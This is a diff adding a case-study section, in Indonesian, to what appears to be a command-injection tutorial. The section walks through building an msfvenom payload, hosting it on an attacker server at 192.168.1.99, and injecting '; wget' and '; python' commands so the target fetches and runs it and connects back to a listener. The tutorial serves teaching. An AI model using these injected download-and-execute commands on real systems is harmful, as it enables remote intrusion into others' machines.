@@ -71,6 +71,30 @@ Contoh payload:
 
 Efektivitas bergantung pada bagaimana aplikasi memproses input dan filter yang diterapkan.
 
+## Studi Kasus
+
+1. **Buat web server** yang berisi payload buatan kita menggunakan `msfvenom`.
+
+2. **Taruh file payload** di path `/payload.py` sehingga dapat diakses dari server attacker (misalnya 192.168.1.99):
+
+    ```
+    http://192.168.1.99/payload.py
+    ```
+
+3. **Gunakan celah Command Injection** di target untuk mendownload payload:
+
+    ```
+    ; wget 192.168.1.99/payload.py
+    ```
+
+4. **Jalankan payload** di target (pastikan server attacker sudah membuka listener):
+
+    ```
+    ; python payload.py
+    ```
+
+5. **Server attacker menerima permintaan koneksi** dari server target setelah payload dijalankan.
+
 ## 📚 Belajar
 
 [owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)
